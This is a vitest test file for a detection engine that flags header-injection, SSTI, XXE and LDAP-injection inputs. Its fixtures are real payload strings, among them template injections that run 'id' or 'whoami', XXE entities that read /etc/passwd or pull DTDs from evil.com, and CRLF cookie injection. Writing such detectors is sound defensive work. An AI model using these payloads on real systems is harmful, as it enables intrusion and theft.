import { describe, it, expect } from 'vitest';
import { createHeaderInjectionEngine } from '../src/lib/detection/header-injection-engine';

// ── CRLF Injection ──────────────────────────────────────────

describe('Header Injection Detection Engine', () => {
    const engine = createHeaderInjectionEngine();

    describe('CRLF Injection', () => {
        it('detects URL-encoded CRLF', () => {
            const result = engine.analyze('value%0d%0aSet-Cookie: evil=true');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'header/crlf')).toBe(true);
        });

        it('detects CRLF followed by header name', () => {
            const result = engine.analyze('value\r\nX-Injected: malicious');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'header/crlf-header')).toBe(true);
        });

        it('detects %0d%0a + Set-Cookie header injection', () => {
            const result = engine.analyze('redirect%0d%0aSet-Cookie: session=hijacked');
            expect(result.detected).toBe(true);
            expect(result.subCategory).toBe('header-injection');
        });

        it('detects %0d%0a + Location header injection', () => {
            const result = engine.analyze('value%0d%0aLocation: http://evil.com');
            expect(result.detected).toBe(true);
        });

        it('detects %0d%0a + Content-Type header injection', () => {
            const result = engine.analyze('value%0d%0aContent-Type: text/html');
            expect(result.detected).toBe(true);
        });

        it('detects %0d%0a + Access-Control header injection', () => {
            const result = engine.analyze('value%0d%0aAccess-Control-Allow-Origin: *');
            expect(result.detected).toBe(true);
        });

        it('does not flag normal header values', () => {
            const result = engine.analyze('application/json');
            expect(result.detected).toBe(false);
        });
    });

    // ── Host Header Attacks ─────────────────────────────────

    describe('Host Header Override', () => {
        it('detects X-Forwarded-Host override', () => {
            const result = engine.analyze('X-Forwarded-Host: evil.com');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'header/host-override')).toBe(true);
        });

        it('detects X-Host override', () => {
            const result = engine.analyze('X-Host: evil.com');
            expect(result.detected).toBe(true);
        });

        it('detects X-Forwarded-Server', () => {
            const result = engine.analyze('X-Forwarded-Server: evil.com');
            expect(result.detected).toBe(true);
        });
    });

    // ── SSTI (Server-Side Template Injection) ───────────────

    describe('SSTI Detection', () => {
        it('detects Jinja2 config access', () => {
            const result = engine.analyze('{{ config.items() }}');
            expect(result.detected).toBe(true);
            expect(result.subCategory).toBe('ssti');
            expect(result.matches.some(m => m.patternId === 'ssti/jinja2')).toBe(true);
        });

        it('detects Jinja2 __class__ traversal', () => {
            const result = engine.analyze('{{ "".__class__.__mro__[2].__subclasses__() }}');
            expect(result.detected).toBe(true);
        });

        it('detects template expression probe {{7*7}}', () => {
            const result = engine.analyze('{{7*7}}');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'ssti/generic-expression')).toBe(true);
        });

        it('detects {{49}} with spaces', () => {
            const result = engine.analyze('{{ 7 * 7 }}');
            expect(result.detected).toBe(true);
        });

        it('detects ERB template injection', () => {
            const result = engine.analyze('<%= system("id") %>');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'ssti/erb')).toBe(true);
        });

        it('detects ERB exec', () => {
            const result = engine.analyze('<%= `whoami` %>');
            expect(result.detected).toBe(true);
        });

        it('detects FreeMarker <#assign', () => {
            const result = engine.analyze('<#assign ex="freemarker.template.utility.Execute"?new()>');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'ssti/freemarker')).toBe(true);
        });

        it('detects FreeMarker exec via ${...}', () => {
            const result = engine.analyze('${Runtime.getRuntime().exec("id")}');
            expect(result.detected).toBe(true);
        });

        it('detects Velocity #set', () => {
            const result = engine.analyze('#set($x = "")');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'ssti/velocity')).toBe(true);
        });

        it('detects Velocity class.forName', () => {
            const result = engine.analyze('${class.forName("java.lang.Runtime")}');
            expect(result.detected).toBe(true);
        });

        it('detects Python __class__ traversal', () => {
            const result = engine.analyze('"".__class__.__mro__[2].__subclasses__()');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'ssti/python-class')).toBe(true);
        });

        it('detects Python __import__', () => {
            const result = engine.analyze('__import__("os").popen("id").read()');
            expect(result.detected).toBe(true);
        });

        it('does not flag normal template syntax', () => {
            const result = engine.analyze('Hello {{ username }}');
            expect(result.detected).toBe(false);
        });
    });

    // ── XXE (XML External Entity) ───────────────────────────

    describe('XXE Detection', () => {
        it('detects DOCTYPE SYSTEM', () => {
            const result = engine.analyze('<!DOCTYPE foo SYSTEM "http://evil.com/xxe.dtd">');
            expect(result.detected).toBe(true);
            expect(result.subCategory).toBe('xxe');
            expect(result.matches.some(m => m.patternId === 'xxe/entity-declaration')).toBe(true);
        });

        it('detects ENTITY SYSTEM', () => {
            const result = engine.analyze('<!ENTITY xxe SYSTEM "file:///etc/passwd">');
            expect(result.detected).toBe(true);
        });

        it('detects parameter entity (blind XXE)', () => {
            const result = engine.analyze('<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'xxe/parameter-entity')).toBe(true);
        });

        it('does not flag normal XML', () => {
            const result = engine.analyze('<user><name>John</name></user>');
            expect(result.detected).toBe(false);
        });
    });

    // ── LDAP Injection ──────────────────────────────────────

    describe('LDAP Injection', () => {
        it('detects LDAP filter injection with (|', () => {
            const result = engine.analyze('user)(|(uid=*)');
            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'ldap/injection')).toBe(true);
        });

        it('detects LDAP filter injection with (&', () => {
            const result = engine.analyze('user)(&(uid=admin)');
            expect(result.detected).toBe(true);
        });

        it('does not flag normal search queries', () => {
            const result = engine.analyze('john.doe@example.com');
            expect(result.detected).toBe(false);
        });
    });

    // ── Engine Configuration ────────────────────────────────

    describe('Configuration', () => {
        it('respects sensitivity=paranoid (lower threshold)', () => {
            const paranoid = createHeaderInjectionEngine({ sensitivity: 'paranoid' });
            const config = paranoid.getConfig();
            expect(config.sensitivity).toBe('paranoid');
            expect(config.confidenceThreshold).toBeLessThan(0.3);
        });

        it('respects sensitivity=low (higher threshold)', () => {
            const low = createHeaderInjectionEngine({ sensitivity: 'low' });
            const config = low.getConfig();
            expect(config.sensitivity).toBe('low');
            expect(config.confidenceThreshold).toBeGreaterThan(0.5);
        });

        it('excludes specific patterns', () => {
            const filtered = createHeaderInjectionEngine({
                excludePatterns: ['ssti/jinja2', 'ssti/erb'],
            });
            const patterns = filtered.getPatterns();
            expect(patterns.some(p => p.id === 'ssti/jinja2')).toBe(false);
            expect(patterns.some(p => p.id === 'ssti/erb')).toBe(false);
            expect(patterns.some(p => p.id === 'header/crlf')).toBe(true);
        });

        it('adds additional custom patterns', () => {
            const custom = createHeaderInjectionEngine({
                additionalPatterns: [{
                    id: 'custom/test',
                    name: 'Custom Pattern',
                    pattern: 'EVIL_TOKEN',
                    type: 'regex',
                    severity: 'critical',
                    description: 'Custom test pattern',
                    enabled: true,
                }],
            });
            const patterns = custom.getPatterns();
            expect(patterns.some(p => p.id === 'custom/test')).toBe(true);
            const result = custom.analyze('EVIL_TOKEN here');
            expect(result.detected).toBe(true);
        });

        it('reports engine metadata', () => {
            expect(engine.id).toBe('header-injection-detection');
            expect(engine.category).toBe('header-injection');
            expect(engine.version).toBe('1.0.0');
        });

        it('handles URL-encoded inputs with recursive decoding', () => {
            // Double-encoded CRLF
            const result = engine.analyze('%250d%250a');
            expect(result.detected).toBe(true);
        });

        it('truncates extremely long inputs', () => {
            const longInput = 'A'.repeat(100000);
            const result = engine.analyze(longInput);
            expect(result.detected).toBe(false);
        });
    });

    // ── MITRE Techniques ────────────────────────────────────

    describe('MITRE ATT&CK', () => {
        it('includes MITRE technique when detected', () => {
            const result = engine.analyze('{{ config.__class__ }}');
            expect(result.detected).toBe(true);
            expect(result.mitreTechniques).toBeDefined();
            expect(result.mitreTechniques!.length).toBeGreaterThan(0);
        });

        it('omits MITRE techniques when not detected', () => {
            const result = engine.analyze('normal text');
            expect(result.detected).toBe(false);
            expect(result.mitreTechniques).toBeUndefined();
        });
    });
});
